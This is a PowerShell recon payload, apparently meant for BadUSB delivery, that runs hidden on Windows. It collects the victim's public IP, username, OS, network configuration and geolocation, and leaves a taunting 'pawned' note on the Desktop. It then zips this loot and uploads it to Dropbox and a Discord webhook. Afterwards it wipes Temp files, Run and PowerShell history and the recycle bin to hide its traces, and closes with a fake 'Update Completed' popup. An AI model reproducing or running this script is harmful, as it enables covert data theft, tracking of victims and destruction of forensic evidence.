$publicIP = (Invoke-WebRequest -Uri "http://checkip.dyndns.org" -UseBasicParsing).Content.Split(":")[1].Trim().Split("<")[0]
$username = $env:username
$os = (Get-WmiObject -Class Win32_OperatingSystem).Name
#$wifi = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $True}).Description

$networkAdapter = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $True}

if ($networkAdapter.DHCPEnabled -eq $True) {
    $ipType = "DHCP"
} else {
    $ipType = "Static"
}

$networkName = $networkAdapter.Description
$ipAddress = $networkAdapter.IPAddress[0]
$subnetMask = $networkAdapter.IPSubnet[0]
$defaultGateway = $networkAdapter.DefaultIPGateway[0]
$location = (Invoke-WebRequest -Uri "http://ipinfo.io/json").Content | ConvertFrom-Json



#For powershell
Write-Host "Network Adapter: $networkName"
Write-Host "IP Type: $ipType"
Write-Host "IP Address: $ipAddress"
Write-Host "Subnet Mask: $subnetMask"
Write-Host "Default Gateway: $defaultGateway"

Write-Host "City: $($location.city)"
Write-Host "Region: $($location.region)"
Write-Host "Country: $($location.country)"
Write-Host "Latitude: $($location.loc.Split(",")[0])"
Write-Host "Longitude: $($location.loc.Split(",")[1])"


# Write information to text file
$text = "We know where you are $publicIP
We know who you are $username
We know on what you work $os

                        ____________
                      .~      ,   . ~.
                     /                \
                    /      /~\/~\   ,  \
                   |   .   \    /   '   |
                   |         \/         |
          XX       |  /~~\        /~~\  |       XX
        XX  X      | |  o  \    /  o  | |      X  XX
      XX     X     |  \____/    \____/  |     X     XX
 XXXXX     XX      \         /\        ,/      XX     XXXXX
X        XX%;;@      \      /  \     ,/      @%%;XX        X
X       X  @%%;;@     |           '  |     @%%;;@  X       X
X      X     @%%;;@   |. ` ; ; ; ;  ,|   @%%;;@     X      X
 X    X        @%%;;@                  @%%;;@        X    X
  X   X          @%%;;@              @%%;;@          X   X
   X  X            @%%;;@          @%%;;@            X  X
    XX X             @%%;;@      @%%;;@             X XX
      XXX              @%%;;@  @%%;;@              XXX
                         @%%;;%%;;@
                           @%%;;@
                         @%%;;@..@@
                          @@@  @@@



"
$text | Out-File -FilePath "C:\Users\$env:username\Desktop\pawned.txt" -Encoding UTF8

# Open the text file
Start-Process -FilePath "notepad.exe" -ArgumentList "C:\Users\$env:username\Desktop\pawned.txt"

############################################################################################################################################################



# MAKE LOOT FOLDER, FILE, and ZIP 

$FolderName = "$env:USERNAME-Recon-$(get-date -f yyyy-MM-dd_hh-mm)"

$FileName = "$FolderName.txt"

$ZIP = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

# OUTPUTS RESULTS TO LOOT FILE

$output = @"

##############################################################################################################################
#                                 |  ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ███████╗ █████╗  ██████╗ ██╗     ███████╗   #
# Title     : We-Found-You        | ██╔═══██╗██║  ██║██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝   #
# Target    : Windows 7,10,11     | ██║██╗██║███████║██║   ██║██╔██╗ ██║██║   ██║█████╗  ███████║██║  ███╗██║     █████╗     #
# Mode      : Hidden              | ██║██║██║██╔══██║██║   ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝     #
#                                 | ╚█║████╔╝██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝███████╗██║  ██║╚██████╔╝███████╗███████╗   #
# Category  : Recon               |  ╚╝╚═══╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝   #
#                                 |  Verrou par verrou et l'un apres l'autre, c'est la cle du bon hacker.                    #
#                                 |    On ne peut pas ouvrir la porte numero 9 avant d'avoir debloque la numero 8.           #
#_________________________________|                                                                                          #
#                                                                                                                            #
#                                                                                                                            #
##############################################################################################################################


$text

"@

$output > $env:TEMP\$FolderName/computerData.txt

Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP

# Upload output file to dropbox

function dropbox {
$TargetFilePath="/$ZIP"
$SourceFilePath="$env:TEMP\$ZIP"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){dropbox}

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}

 

############################################################################################################################################################

<#
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		
############################################################################################################################################################

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
